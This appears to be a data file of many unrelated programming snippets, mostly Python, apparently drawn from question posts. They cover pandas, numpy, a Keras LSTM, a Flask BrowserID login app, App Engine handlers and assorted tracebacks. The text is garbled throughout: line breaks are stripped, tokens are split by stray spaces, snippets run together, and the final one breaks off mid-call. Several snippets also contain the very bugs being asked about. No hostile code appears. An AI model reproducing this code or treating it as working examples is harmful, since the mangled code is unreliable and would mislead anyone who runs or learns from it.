by mean score '' '' '' # here goes the pandas functions I already wrote mean_satisfaction = mean ( satisfaction ) return mean_satisfaction/mean_scoressatisf_div_score = example_f ( satisfaction , mean_scores ) # Here push satisf_div_score to ` schools ` table"
"# ! /bin/python3import osimport globimport shutilimport datetimedef Copy_Logs ( ) : Info_month = datetime.datetime.now ( ) .strftime ( `` % B '' ) # The result of the below glob _is_ a full path for filename in glob.glob ( `` /data1/logs/ { 0 } /*/*.txt '' .format ( Info_month ) ) : if os.path.getsize ( filename ) > 0 : if not os.path.exists ( `` /data2/logs/ '' + os.path.basename ( filename ) ) : shutil.copy ( filename , `` /data2/logs/ '' ) if __name__ == '__main__ ' : Copy_Logs ( ) import osimport globimport filecmpimport shutilimport datetimedef Copy_Logs ( ) : Info_month = datetime.datetime.now ( ) .strftime ( `` % B '' ) for filename in glob.glob ( `` /data1/logs/ { 0 } /*/*.txt '' .format ( Info_month ) ) : if os.path.getsize ( filename ) > 0 : if not os.path.exists ( `` /data2/logs/ '' + os.path.basename ( filename ) ) or not filecmp.cmp ( `` /data2/logs/ '' + os.path.basename ( filename ) , `` /data2/logs/ '' ) : shutil.copyfile ( filename , `` /data2/logs/ '' ) if __name__ == '__main__ ' : Copy_Logs ( )"
"> > > import sympy > > > v = sympy.MatrixSymbol ( ' v ' , 2 , 1 ) > > > Z = sympy.zeros ( 2 , 2 ) # create 2x2 zero matrix > > > I = sympy.exp ( Z ) # exponentiate zero matrix to get identity matrix > > > I * vTraceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > File `` sympy/matrices/matrices.py '' , line 507 , in __mul__ blst = B.T.tolist ( ) AttributeError : 'Transpose ' object has no attribute 'tolist ' > > > I_ = sympy.eye ( 2 ) # directly create the identity matrix > > > I_ == I # check the two matrices are equalTrue > > > I_ * vv > > > I.__class__sympy.matrices.immutable.ImmutableMatrix > > > I_.__class__sympy.matrices.dense.MutableDenseMatrix > > > I.as_mutable ( ) * vv"
"Code Items123 eq-hk456 ca-eu ; tp-lbe789 ca-us321 go-ch654 ca-au ; go-au987 go-jp147 co-ml ; go-ml258 ca-us369 ca-us ; ca-my741 ca-us852 ca-eu963 ca-ml ; co-ml ; go-ml Code eq ca go co tp123 hk 456 eu lbe789 us 321 ch 654 au au 987 jp 147 ml ml 258 us 369 us , my 741 us 852 eu 963 ml ml ml"
"import torchimport torch.nn as nnclass NeoEmbeddings ( nn.Embedding ) : def __init__ ( self , num_embeddings : int , embedding_dim : int , padding_idx=-1 ) : super ( ) .__init__ ( num_embeddings , embedding_dim , padding_idx ) self.register_forward_pre_hook ( self.neo_genesis ) @ staticmethod def neo_genesis ( self , input , higgs_bosson=0 ) : if higgs_bosson : input = input + higgs_bosson return input > > > x = NeoEmbeddings ( 10 , 5 , 1 ) > > > x.forward ( torch.tensor ( [ 0,2,5,8 ] ) ) tensor ( [ [ -1.6449 , 0.5832 , -0.0165 , -1.3329 , 0.6878 ] , [ -0.3262 , 0.5844 , 0.6917 , 0.1268 , 2.1363 ] , [ 1.0772 , 0.1748 , -0.7131 , 0.7405 , 1.5733 ] , [ 0.7651 , 0.4619 , 0.4388 , -0.2752 , -0.3018 ] ] , grad_fn= < EmbeddingBackward > ) > > > print ( x._forward_pre_hooks ) OrderedDict ( [ ( 25 , < function NeoEmbeddings.neo_genesis at 0x1208d10d0 > ) ] ) > > > x = NeoEmbeddings ( 10 , 5 , 1 ) > > > x.forward ( torch.tensor ( [ 0,2,5,8 ] ) , higgs_bosson=2 ) -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- TypeError Traceback ( most recent call last ) < ipython-input-102-8705a40a3cc2 > in < module > 1 x = NeoEmbeddings ( 10 , 5 , 1 ) -- -- > 2 x.forward ( torch.tensor ( [ 0,2,5,8 ] ) , higgs_bosson=2 ) TypeError : forward ( ) got an unexpected keyword argument 'higgs_bosson '"
"import numpy as np # sample distributiond = np.array ( [ x ** 2 for x in range ( 1,6 ) ] , dtype=float ) d = d / d.sum ( ) dcs = d.cumsum ( ) bins = np.zeros ( d.shape ) N = 100for roll in np.random.rand ( N ) : # grab the first index that the roll satisfies i = np.where ( roll < dcs ) [ 0 ] [ 0 ] bins [ i ] += 1"
import pygletpyglet.window.Window ( ) pyglet.app.run ( )
"# LSTM for international airline passengers problem with regression framingimport numpyimport matplotlib.pyplot as pltfrom pandas import read_csvimport mathfrom keras.models import Sequentialfrom keras.layers import Densefrom keras.layers import LSTMfrom sklearn.preprocessing import MinMaxScalerfrom sklearn.metrics import mean_squared_error # convert an array of values into a dataset matrixdef create_dataset ( dataset , look_back=1 ) : dataX , dataY = [ ] , [ ] for i in range ( len ( dataset ) -look_back-1 ) : a = dataset [ i : ( i+look_back ) , 0 ] dataX.append ( a ) dataY.append ( dataset [ i + look_back , 0 ] ) return numpy.array ( dataX ) , numpy.array ( dataY ) # fix random seed for reproducibilitynumpy.random.seed ( 7 ) # load the datasetdataset = np.sin ( np.linspace ( 0,35,10000 ) ) .reshape ( -1,1 ) print ( type ( dataset ) ) print ( dataset.shape ) dataset = dataset.astype ( 'float32 ' ) # normalize the datasetscaler = MinMaxScaler ( feature_range= ( 0 , 1 ) ) dataset = scaler.fit_transform ( dataset ) # split into train and test setstrain_size = int ( len ( dataset ) * 0.5 ) test_size = len ( dataset ) - train_sizetrain , test = dataset [ 0 : train_size , : ] , dataset [ train_size : len ( dataset ) , : ] # reshape into X=t and Y=t+1look_back = 1trainX , trainY = create_dataset ( train , look_back ) testX , testY = create_dataset ( test , look_back ) # reshape input to be [ samples , time steps , features ] trainX = numpy.reshape ( trainX , ( trainX.shape [ 0 ] , 1 , trainX.shape [ 1 ] ) ) testX = numpy.reshape ( testX , ( testX.shape [ 0 ] , 1 , testX.shape [ 1 ] ) ) # create and fit the LSTM networkmodel = Sequential ( ) model.add ( LSTM ( 16 , input_shape= ( 1 , look_back ) ) ) model.add ( Dense ( 1 ) ) model.compile ( loss='mean_squared_error ' , optimizer='adam ' ) model.fit ( trainX , trainY , epochs=10 , batch_size=1 , verbose=2 ) # make predictionstrainPredict = model.predict ( trainX ) testPredict = list ( ) prediction = model.predict ( testX [ 0 ] .reshape ( 1,1,1 ) ) for i in range ( trainX.shape [ 0 ] ) : prediction = model.predict ( prediction.reshape ( 1,1,1 ) ) testPredict.append ( prediction ) testPredict = np.array ( testPredict ) .reshape ( -1,1 ) # invert predictionstrainPredict = scaler.inverse_transform ( trainPredict ) trainY = scaler.inverse_transform ( [ trainY ] ) testPredict = scaler.inverse_transform ( testPredict ) testY = scaler.inverse_transform ( [ testY ] ) # calculate root mean squared errortrainScore = math.sqrt ( mean_squared_error ( trainY [ 0 ] , trainPredict [ : ,0 ] ) ) print ( 'Train Score : % .2f RMSE ' % ( trainScore ) ) testScore = math.sqrt ( mean_squared_error ( testY [ 0 ] , testPredict [ : ,0 ] ) ) print ( 'Test Score : % .2f RMSE ' % ( testScore ) ) # shift train predictions for plottingtrainPredictPlot = numpy.empty_like ( dataset ) trainPredictPlot [ : , : ] = numpy.nantrainPredictPlot [ look_back : len ( trainPredict ) +look_back , : ] = trainPredict # shift test predictions for plottingtestPredictPlot = numpy.empty_like ( dataset ) testPredictPlot [ : , : ] = numpy.nantestPredictPlot [ len ( trainPredict ) + ( look_back*2 ) +1 : len ( dataset ) -1 , : ] = testPredict # plot baseline and predictionsplt.plot ( scaler.inverse_transform ( dataset ) ) plt.plot ( trainPredictPlot ) plt.plot ( testPredictPlot ) plt.show ( )"
"import numbersdef running_sum ( ) : g_in = 0 g_out = 0 while g_in is not None : g_in = ( yield g_out ) if isinstance ( g_in , numbers.Number ) : g_out += g_in print 'in_val = ' , g_in , 'sum = ' , g_out"
from sqlalchemy.inspection import inspectinspect ( person.__class__ ) .relationships inspect ( person.__class__ ) .hybrid_properties
"> > > math.pow ( 400.0 , math.pow ( 400.0,400.0 ) ) Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > OverflowError : math range error > > > np.power ( 400.0 , np.power ( 400.0,400.0 ) ) > > > inf"
"from google.appengine.api import taskqueuetaskqueue.add ( name='foobar ' , url='/some-handler ' , params= { 'foo ' : 'bar ' } task_queue = taskqueue.Queue ( 'default ' ) task_queue.delete_tasks_by_name ( 'foobar ' ) # would work # looking for a method like this : foobar_task = task_queue.get_task_by_name ( 'foobar ' )"
"n = len ( [ 1,2,3,4,5,6,7,8 ] ) k = 8timeit ( 'range ( log ( n , 2 ) ) ' , number=2 , repeat=3 ) # Test 1timeit ( 'range ( log ( k , 2 ) ) ' , number=2 , repeat=3 ) # Test 2 2 loops , best of 3 : 2.2 s per loop2 loops , best of 3 : 3.46 µs per loop"
"myvar = 10 # type : intmyvar = math.inf # < -- raises a typing error because math.inf is a float myvar = 10 # type : Union [ int , float ]"
"> > > list ( map ( lambda *x : x , *map ( None , 'abc ' ) ) ) Traceback ( most recent call last ) : File `` < pyshell # 52 > '' , line 1 , in < module > list ( map ( lambda *x : x , *map ( None , 'abc ' ) ) ) TypeError : type object argument after * must be an iterable , not map > > > list ( map ( lambda *x : x , *map ( str , 'abc ' ) ) ) [ ( ' a ' , ' b ' , ' c ' ) ]"
"# ifndef HEADER1_HPP # define HEADER1_HPP # include < Python.h > # include < numpy/npy_3kcompat.h > # include < numpy/arrayobject.h > void initialize ( ) ; # endif # include `` header1.hpp '' void* wrap_import_array ( ) { import_array ( ) ; return ( void* ) 1 ; } void initialize ( ) { wrap_import_array ( ) ; } # include `` header1.hpp '' # include < iostream > void* loc_wrap_import_array ( ) { import_array ( ) ; return ( void* ) 1 ; } void loc_initialize ( ) { loc_wrap_import_array ( ) ; } int main ( ) { Py_Initialize ( ) ; # ifdef USE_LOC_INIT loc_initialize ( ) ; # else initialize ( ) ; # endif npy_intp dims [ ] = { 5 } ; std : :cout < < `` creating descr '' < < std : :endl ; PyArray_Descr* dtype = PyArray_DescrFromType ( NPY_FLOAT64 ) ; std : :cout < < `` zeros '' < < std : :endl ; PyArray_Zeros ( 1 , dims , dtype , 0 ) ; std : :cout < < `` cleanup '' < < std : :endl ; return 0 ; } g++ file1.cpp file2.cpp -o segissue -lpython3.4m -I/usr/include/python3.4m -DUSE_LOC_INIT./segissue # runs fineg++ file1.cpp file2.cpp -o segissue -lpython3.4m -I/usr/include/python3.4m./segissue # segfaults"
"h1 = { `` a '' :3 , `` b '' :5 , `` c '' :2 } h2 = { `` a '' :1 , `` c '' :5 , `` d '' :10 } result = merge ( h1 , h2 ) = { `` a '' :1 , `` b '' :5 , `` c '' :2 , `` d '' :10 }"
"> > > def validate ( schema=None ) : def wrap ( f ) : def _f ( *args , **kwargs ) : if not schema : schema = f.__name__ print schema return f ( ) return _f return wrap > > > @ validate ( ) def some_function ( ) : print 'some function ' > > > some_function ( ) Traceback ( most recent call last ) : File `` < pyshell # 27 > '' , line 1 , in < module > some_function ( ) File `` < pyshell # 22 > '' , line 4 , in _f if not schema : UnboundLocalError : local variable 'schema ' referenced before assignment > > >"
class Dog : @ abc.abstractmethod def bark ( self ) - > str : raise NotImplementedError ( `` A dog must bark '' ) class Chihuahua ( Dog ) : def bark ( self ) : return 123
"> > > import magic > > > magic.from_file ( 'my_json_file.txt ' ) 'ASCII text , with very long lines , with no line terminators '"
"class OpenIDLoginHandler ( webapp.RequestHandler ) : def get ( self ) : domain = self.request.get ( 'domain ' ) continue_url = self.request.GET.get ( 'continue ' ) if not continue_url : continue_url = 'https : //my_domain/login_required_directory/ ' if domain : self.redirect ( users.create_login_url ( dest_url=continue_url , _auth_domain=None , federated_identity=domain ) ) else : login_url = users.create_login_url ( dest_url=continue_url , federated_identity='https : //www.google.com/accounts/o8/id ' ) self.redirect ( login_url ) application = webapp.WSGIApplication ( [ ( '/_ah/login_required ' , OpenIDLoginHandler ) ] , debug=True ) def main ( ) : run_wsgi_app ( application ) if __name__ == `` __main__ '' : main ( )"
"list= [ 'random ' , 'stuff ' , 1 ] with open ( textfile , ' a ' ) as txtfile : for item in list : print ( `` '' '' Need to have stuff before % a and after each loop string '' '' '' % item , file=txtfile )"
"def dispatch ( change ) : global jobs , db_url # jobs is my queue db = Database ( db_url ) work_order = db.get ( change [ 'id ' ] ) # change is an id to the document that changed . # i need to get the actual document ( workorder ) worker = Worker ( work_order , db ) # fire the thread jobs.append ( worker ) worker.start ( ) returnmain ( ) ... consumer.wait ( cb=dispatch , since=update_seq , timeout=10000 ) # wait constains the asyncloop ."
"def writeGzipFile ( file_name , content ) : import gzip with gzip.open ( file_name , 'wb ' ) as f : if not content == `` : try : f.write ( content ) except IOError as ioe : print `` I/O ERROR wb '' , ioe.message except ValueError as ve : print `` VALUE ERROR wb : `` , ve.message except EOFError as eofe : print `` EOF ERROR wb : `` , eofe.message except : print `` UNEXPECTED ERROR wb '' def writeGzipFile ( file_name , content , file_permission=None ) : import gzip , traceback with gzip.open ( file_name , 'wb ' ) as f : if not content == `` : try : f.write ( content ) except IOError as ioe : print `` I/O ERROR wb '' , ioe.message except ValueError as ve : print `` VALUE ERROR wb : `` , ve.message except EOFError as eofe : print `` EOF ERROR wb : `` , eofe.message except Exception , err : print `` EXCEPTION : '' , err.message print `` TRACEBACK_1 : '' , traceback.print_exc ( file=sys.stdout ) except : print `` UNEXPECTED ERROR wb '' EXCEPTION : size does not fit in an intTRACEBACK_1 : Traceback ( most recent call last ) : File `` /home/anadin/dev/illumina-project-restructor_mass-splitting/illumina-project-restructor/tools/file_utils/file_compression.py '' , line 131 , in writeGzipFile f.write ( content ) File `` /usr/local/cluster/python2.7/lib/python2.7/gzip.py '' , line 230 , in write self.crc = zlib.crc32 ( data , self.crc ) & 0xffffffffLOverflowError : size does not fit in an intNone"
"label_ratio = 1.0/8.0 pos_labels = { } # For each node in the Graph for node in network.graph.nodes ( ) : # Get the node 's position from the layout x , y = network.position [ node ] # Get the node 's neighbourhood N = network.graph [ node ] # Find the centroid of the neighbourhood . The centroid is the average of the Neighbourhood 's node 's x and y coordinates respectively . # Please note : This could be optimised further cx = sum ( map ( lambda x : pos [ x ] [ 0 ] , N ) ) / len ( pos ) cy = sum ( map ( lambda x : pos [ x ] [ 1 ] , N ) ) / len ( pos ) # Get the centroid 's 'direction ' or 'slope ' . That is , the direction TOWARDS the centroid FROM aNode . slopeY = ( y-cy ) slopeX = ( x-cx ) # Position the label at some distance along this line . Here , the label is positioned at about 1/8th of the distance . pos_labels [ node ] = ( x+slopeX*label_ratio , y+slopeY*label_ratio ) nx.draw ( G , pos , ax=axis , node_size=20 , with_labels=False ) nx.draw_networkx_labels ( G , pos_labels , labels , font_size=7 , font_color= ' b ' , ax=axis )"
"albums_today = [ 'album1 ' , 'album2 ' , 'album3 ' ] albums_yesterday = [ 'album2 ' , 'album1 ' , 'album3 ' ] { 'album1':1 , 'album2 ' : -1 , 'album3':0 }"
"def QuickSort ( array ) : qsort ( array , 0 , len ( array ) ) def qsort ( arr , left , right ) : if ( ( right - left ) < 2 ) : return pivotIndex = choosePivot0 ( arr , left , right ) newPivotIndex = partition ( arr , pivotIndex , left , right ) qsort ( arr , 0 , newPivotIndex ) qsort ( arr , newPivotIndex + 1 , right ) def partition ( arr , pivotIndex , left , right ) : swap ( arr , pivotIndex , left ) pivot = arr [ left ] i = left + 1 for j in range ( left+1 , right ) : if ( arr [ j ] < pivot ) : swap ( arr , i , j ) i = i + 1 swap ( arr , left , i-1 ) # put pivot back where it belongs # cobj.count = cobj.count + ( right - left - 1 ) # add m-1 the # of comparisons return ( i-1 ) # give back where the pivot residesdef swap ( array , i , j ) : temp = array [ i ] array [ i ] = array [ j ] array [ j ] = tempdef choosePivot0 ( array , left , right ) : return randint ( left , right-1 ) # random"
"name = 'Joe'print ( name , ' , you won ! ' ) > > > Joe , you won ! name='Joe'name=name.rstrip ( ) print ( name , ' , you won ! ' ) > > > Joe , you won ! name='Joe'name=name+ ' , 'print ( name , 'you won ! ' ) > > > Joe , you won !"
"import pandas as pdimport numpy as npdf = pd.DataFrame ( np.arange ( 6 ) .reshape ( 3 , 2 ) , index= [ 0 , 0 , 1 ] ) x = df.ix [ 0 ] y = df.ix [ 1 ]"
"import sqlite3from flask import Flask , request , session , g , redirect , url_for , abort , render_template , flashfrom contextlib import closingimport timefrom flask.ext.login import LoginManager , UserMixinfrom flaskext.browserid import BrowserIDfrom flask.ext.sqlalchemy import SQLAlchemy # # SETUPDEBUG = TrueSECRET_KEY = 'development key'USERNAME = 'admin'PASSWORD = 'default'app = Flask ( __name__ ) app.config [ 'SQLALCHEMY_DATABASE_URI ' ] = 'sqlite : ////tmp/flaskr.db'db = SQLAlchemy ( app ) app.config.from_object ( __name__ ) app.config [ 'BROWSERID_LOGIN_URL ' ] = `` /login '' app.config [ 'BROWSERID_LOGOUT_URL ' ] = `` /logout '' app.config [ 'SECRET_KEY ' ] = `` deterministic '' app.config [ 'TESTING ' ] = Trueclass User ( UserMixin , db.Model ) : id = db.Column ( db.Integer , primary_key=True ) email = db.Column ( db.UnicodeText , unique=True ) firstname = db.Column ( db.Unicode ( 40 ) ) lastname = db.Column ( db.Unicode ( 40 ) ) date_register = db.Column ( db.Integer ) bio = db.Column ( db.Text ) facebook = db.Column ( db.Unicode ( 1000 ) ) twitter = db.Column ( db.Unicode ( 1000 ) ) website = db.Column ( db.Unicode ( 1000 ) ) image = db.Column ( db.LargeBinary ) def __init__ ( self , email , firstname=None , lastname=None , date_register=None , bio=None , facebook=None , twitter=None , website=None , image=None ) : self.email = email self.firstname = firstname self.lastname = lastname self.date_register = time.time ( ) self.bio = bio self.facebook = facebook self.twitter = twitter self.website = website self.image = image self.email = email def __repr__ ( self ) : return ' < User % r > ' % self.email # # # Login Functions # # # def get_user_by_id ( id ) : `` '' '' Given a unicode ID , returns the user that matches it. `` '' '' for row in db.session.query ( User ) .filter ( User.id == id ) : if row is not None : return row.User return Nonedef create_browserid_user ( kwargs ) : `` '' '' Takes browserid response and creates a user. `` '' '' if kwargs [ 'status ' ] == 'okay ' : user = User ( kwargs [ 'email ' ] ) db.session.add ( user ) db.session.commit ( ) return user else : return Nonedef get_user ( kwargs ) : `` '' '' Given the response from BrowserID , finds or creates a user . If a user can neither be found nor created , returns None. `` '' '' import pdb ; pdb.set_trace ( ) # try to find the user for row in db.session.query ( User ) .filter ( User.email == kwargs.get ( 'email ' ) ) : if row is not None : return row.User for row in db.session.query ( User ) .filter ( User.id == kwargs.get ( 'id ' ) ) : if row is not None : return row.User # try to create the user return create_browserid_user ( kwargs ) login_manager = LoginManager ( ) login_manager.user_loader ( get_user_by_id ) login_manager.init_app ( app ) browserid = BrowserID ( ) browserid.user_loader ( get_user ) browserid.init_app ( app ) # # # Routing # # # @ app.route ( '/ ' ) def home ( ) : return render_template ( 'index.html ' ) if __name__ == '__main__ ' : app.run ( ) < html > < head > < script type= '' text/javascript '' src= '' https : //ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js '' > < /script > < script src= '' https : //login.persona.org/include.js '' type= '' text/javascript '' > < /script > < script type= '' text/javascript '' > { { auth_script|safe } } < /script > < /head > < body > { % if current_user.is_authenticated ( ) % } < button id= '' browserid-logout '' > Logout < /button > { % else % } < button id= '' browserid-login '' > Login < /button > { % endif % } < /body > < /html > Traceback ( most recent call last ) : File `` /Library/Python/2.7/site-packages/flask/app.py '' , line 1701 , in __call__ return self.wsgi_app ( environ , start_response ) File `` /Library/Python/2.7/site-packages/flask/app.py '' , line 1689 , in wsgi_app response = self.make_response ( self.handle_exception ( e ) ) File `` /Library/Python/2.7/site-packages/flask/app.py '' , line 1687 , in wsgi_app response = self.full_dispatch_request ( ) File `` /Library/Python/2.7/site-packages/flask/app.py '' , line 1360 , in full_dispatch_request rv = self.handle_user_exception ( e ) File `` /Library/Python/2.7/site-packages/flask/app.py '' , line 1358 , in full_dispatch_request rv = self.dispatch_request ( ) File `` /Library/Python/2.7/site-packages/flask/app.py '' , line 1344 , in dispatch_request return self.view_functions [ rule.endpoint ] ( **req.view_args ) File `` /Users/jzeller/Classes/CS494/main.py '' , line 106 , in home return render_template ( 'test.html ' ) File `` /Library/Python/2.7/site-packages/flask/templating.py '' , line 123 , in render_template ctx.app.update_template_context ( context ) File `` /Library/Python/2.7/site-packages/flask/app.py '' , line 692 , in update_template_context context.update ( func ( ) ) File `` /Library/Python/2.7/site-packages/flask_login.py '' , line 799 , in _user_context_processor return dict ( current_user=_get_user ( ) ) File `` /Library/Python/2.7/site-packages/flask_login.py '' , line 768 , in _get_user current_app.login_manager._load_user ( ) File `` /Library/Python/2.7/site-packages/flask_login.py '' , line 348 , in _load_user return self.reload_user ( ) File `` /Library/Python/2.7/site-packages/flask_login.py '' , line 312 , in reload_user user = self.user_callback ( user_id ) File `` /Users/jzeller/Classes/CS494/main.py '' , line 60 , in get_user_by_id print `` get_user_by_id - `` + str ( type ( row.User ) ) + `` - `` + str ( row.User ) AttributeError : 'User ' object has no attribute 'User '"
"from collections import defaultdicttest_data = [ ( 'clay ' , 'happy ' ) , ( 'jason ' , 'happy ' ) , ( 'aj ' , 'sad ' ) , ( 'eric ' , 'happy ' ) , ( 'sophie ' , 'sad ' ) ] def default_dict_success ( ) : results = defaultdict ( list ) for person , mood in test_data : results [ mood ] .append ( person ) print resultsdef default_dict_failure ( ) : results = defaultdict ( default_factory=list ) for person , mood in test_data : results [ mood ] .append ( person ) print resultsdefault_dict_success ( ) default_dict_failure ( ) # First function succeedsdefaultdict ( < type 'list ' > , { 'sad ' : [ 'aj ' , 'sophie ' ] , 'happy ' : [ 'clay ' , 'jason ' , 'eric ' ] } ) # Second function failsTraceback ( most recent call last ) : File `` test_default_dict.py '' , line 26 , in < module > default_dict_failure ( ) File `` test_default_dict.py '' , line 21 , in default_dict_failure results [ mood ] .append ( person ) KeyError : 'happy '"
"# ! /usr/bin/env python # -*- coding : utf-8 -*-import osimport sysimport optparseimport ConfigParserepo_file = `` /home/nmarques/my_repos.repo '' parser = optparse.OptionParser ( ) parser.add_option ( `` -e '' , dest= '' repository '' , help= '' Enable YUM repository '' ) parser.add_option ( `` -d '' , dest= '' repository '' , help= '' Disable YUM repository '' ) parser.add_option ( `` -l '' , dest= '' list '' , help= '' Display list of repositories '' , action= '' store_true '' ) ( options , args ) = parser.parse_args ( ) def list_my_repos ( ) # check if repository file exists , read repositories , print and exit if os.path.exists ( repo_file ) : config = ConfigParser.RawConfigParser ( ) config.read ( repo_file ) print `` Found the following YUM repositories on `` + os.path.basename ( repo_file ) + `` : '' for i in config.sections ( ) : print i sys.exit ( 0 ) # otherwise exit with code 4 else : print `` Main repository configuration ( `` + repo_file + '' ) file not found ! '' sys.exit ( 4 ) list_my_repos ( )"
"lst1= [ ' a ' , ' b ' , ' c ' ] lst2= [ ' c ' , 'd ' , ' e ' ] lst3= [ ] for i in lst1 : if i not in lst2 : lst3.append ( i )"
"list1 = [ ( 'my ' , ' 1.2.3 ' , 2 ) , ( 'name ' , ' 9.8.7 ' , 3 ) ] list2 = [ ( 'my2 ' , 2 ) , ( 'name8 ' , 3 ) ] for i , j , k in list1 : # print ( i , j , k ) x = j.split ( ' . ' ) [ 1 ] y = str ( i ) .join ( x ) print ( y ) 28 my2name8"
"import numpy as npimport pandas as pdnp.random.seed ( 1 ) frame = pd.DataFrame ( np.random.randn ( 4 , 3 ) , columns=list ( 'bde ' ) , index= [ 'Utah ' , 'Ohio ' , 'Texas ' , 'Oregon ' ] ) print ( 'frame : { 0 } '.format ( frame ) ) store = pd.HDFStore ( 'file.h5 ' ) store [ 'df ' ] = framestore.close ( ) frame : b d eUtah 1.624345 -0.611756 -0.528172Ohio -1.072969 0.865408 -2.301539Texas 1.744812 -0.761207 0.319039Oregon -0.249370 1.462108 -2.060141 # source ( `` http : //bioconductor.org/biocLite.R '' ) # biocLite ( `` rhdf5 '' ) library ( rhdf5 ) frame = h5ls ( `` file.h5 '' ) frame > frame group name otype dclass dim0 / df H5I_GROUP 1 /df axis0 H5I_DATASET STRING 32 /df axis1 H5I_DATASET STRING 43 /df block0_items H5I_DATASET STRING 34 /df block0_values H5I_DATASET FLOAT 3 x 4 > frame2 = h5read ( `` file.h5 '' , '/df ' ) frame2 > frame2 $ axis0 [ 1 ] `` b '' `` d '' `` e '' $ axis1 [ 1 ] `` Utah '' `` Ohio '' `` Texas '' `` Oregon '' $ block0_items [ 1 ] `` b '' `` d '' `` e '' $ block0_values [ ,1 ] [ ,2 ] [ ,3 ] [ ,4 ] [ 1 , ] 1.6243454 -1.0729686 1.7448118 -0.2493704 [ 2 , ] -0.6117564 0.8654076 -0.7612069 1.4621079 [ 3 , ] -0.5281718 -2.3015387 0.3190391 -2.0601407"
"length = 10numbers = [ x for x in range ( length ) ] start_index = randint ( 0 , length-1 ) # now output each value in order from start to start-1 ( or end ) # ex . if start = 3 -- > output = 3,4,5,6,7,8,9,0,1,2 # ex if start = 9 -- - > output = 9,0,1,2,3,4,5,6,7,8"
date name2015-04-03 A2015-04-04 A2015-04-05 A2015-04-03 B df [ df.shift ( 1 ) .contains ( df.name ) or df.shift ( -1 ) .contains ( df.name ) ] date name2015-04-03 A2015-04-04 A2015-04-05 A
stations = [ ] for row in data : if row.strip ( ) : stations.append ( row.strip ( ) ) stations = [ row.strip ( ) for row in data if row.strip ( ) ] stations = [ ] for row in data : blah = row.strip ( ) if blah : stations.append ( blah ) > Striptwice list comp 14.5714301669 > Striptwice loop 17.9919670399 > Striponce loop 13.0950567955 # @ JonClements & @ ErikAllik > Striptonce list comp 10.7998494348 # @ adhie > Mapmethod loop 14.4501044569
"from setuptools import setupAPP= [ 'myapp.py ' ] DATA_FILES= [ ( `` , [ 'config.cfg ' ] ) ] OPTIONS= { 'iconfile ' : 'cc.icns ' , 'argv_emulation ' : True , 'plist ' : { 'CFBundleShortVersionString ' : ' 1.0 ' } } setup ( app=APP , data_files=DATA_FILES , options= { 'py2app ' : OPTIONS } , setup_requires= [ 'py2app ' ] )"
"a = [ 1,3,5,7,9 ] b = [ 2,4,6,8,10 ] a = [ 0,1,0,1,0,1,0,1,0,1,0 ] b = [ 0,0,1,0,1,0,1,0,1,0,1 ]"
"if s < t : # less than ... elif t < s : # greater than ... else : # equal ... r = bytes_compare ( s , t ) if r < 0 : # less than ... elif r > 0 : # greater than ... else : # equal ..."
"loader.load ( name='mylib ' , version= ' 1.0 ' ) import mylibmylib.load ( version= ' 1.0 ' ) class MyClass_1_0 : def func1 ( self ) : return 'Baz ' def func2 ( self ) : return 'Bar'class MyClass_1_1 ( MyClass_1_0 ) : # Overwriting a function : def func1 ( self ) : return 'Foo ' # Definining a new function which uses a function # from a previous version : def func3 ( self ) : print ( `` { } { } '' .format ( self.func1 ( ) , self.func2 ( ) ) ) # Change this to the latest version for stuff that always wants the latestclass MyClass ( MyClass_1_1 ) : pass > > > from my.module import MyClass_1_1 as MyClass > > > m = MyClass ( ) > > > m.func3 ( ) Foo Bar"
"# include < vector > inline std : :vector < uint8_t > & vec ( ) { static std : :vector < uint8_t > v { ' a ' , ' b ' , ' c ' , 'd ' } ; return v ; } inline const std : :vector < uint8_t > & cvec ( ) { return vec ( ) ; }"
"> > > ' { :20 , .2 } '.format ( f ) '18,446,744,073,709,551,616.00 ' print 'the cost = $ ' + str ( var1 ) + '\n'print 'the cost = $ ' + str ( var2 ) + '\n '"
"class UserReportedCountry ( db.Model ) : country_name = db.StringProperty ( required=True , choices= [ 'Afghanistan ' , 'Aring land Islands ' ] ) class UserReportedCity ( db.Model ) : country = db.ReferenceProperty ( UserReportedCountry , collection_name='cities ' ) city_name = db.StringProperty ( required=True ) class UserCountryForm ( djangoforms.ModelForm ) : class Meta : model = UserReportedCountryclass UserCityForm ( djangoforms.ModelForm ) : class Meta : model = UserReportedCity exclude = ( 'country ' , ) __TEMPLATE_USER_COUNTRY_FORM = 'user_country_form ' __TEMPLATE_USER_CITY_FORM = 'user_city_form ' def get ( self ) : template_values = { self.__TEMPLATE_USER_COUNTRY_FORM : UserCountryForm ( ) , self.__TEMPLATE_USER_CITY_FORM : UserCityForm ( ) } # rendering the html page and passing the template_values self.response.out.write ( template.render ( self.__MAIN_HTML_PAGE , template_values ) ) < div id= '' userDataForm '' > < form method= '' POST '' action= '' /UserReporting '' > < table > < ! -- Printing the forms for users country , city -- > { { user_country_form } } { { user_city_form } } < /table > < input type= '' submit '' name= '' submit '' value= `` submit '' > < /form > < /div > def post ( self ) : self.store_user_data ( ) self.redirect ( '/ ' ) # method to save users data in the models UserReportedCountry , UserReportedCitydef store_user_data ( self ) : # getting user 's country and city user_reported_country = UserCountryForm ( self.request.POST ) user_reported_city = UserCityForm ( self.request.POST ) if ( user_reported_country.is_valid ( ) and user_reported_city.is_valid ( ) ) : # save the country data country_entity = user_reported_country.save ( ) # save the city data , and relate county with city city_entity = user_reported_city.save ( commit=False ) city_entity.country = country_entity city_entity.put ( ) return else : return def store_user_data ( self ) : # getting user 's country and city user_reported_country = UserCountryForm ( self.request.POST ) user_reported_city = UserCityForm ( self.request.POST ) if ( user_reported_country.is_valid ( ) and user_reported_city.is_valid ( ) ) : # save the country and city data country_record = self.store_country_data ( ) city_record = self.store_city_data ( country_record ) return else : returndef store_country_data ( self ) : user_reported_country_name = self.request.POST [ 'country_name ' ] key_name = self.sanitize_key_name ( user_reported_country_name ) country_entity = UserReportedCountry.get_or_insert ( key_name , country_name = user_reported_country_name ) country_entity.put ( ) return country_entitydef store_city_data ( self , country_record ) : user_reported_city_name = self.request.POST [ 'city_name ' ] key_name = self.sanitize_key_name ( `` % s : % s '' % ( country_record.country_name , str ( user_reported_city_name ) ) ) city_entity = UserReportedCity.get_or_insert ( key_name , city_name = user_reported_city_name , country= country_record ) city_entity.put ( ) return city_entitydef sanitize_key_name ( self , key_name ) : return re.sub ( r'\s ' , 